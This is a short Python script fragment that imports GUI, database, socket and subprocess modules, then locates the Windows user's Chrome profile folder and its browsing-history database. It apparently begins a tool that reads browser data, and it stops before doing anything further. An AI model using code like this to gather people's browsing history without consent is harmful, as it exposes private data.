from tkinter import *;
from tkinter import ttk
from Settings import *
import sqlite3
from ctypes import windll
import winshell
import shutil
import tempfile
import os
import socket
import shutil
import subprocess
data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
files = os.listdir(data_path)
history_db = os.path.join(data_path, 'history')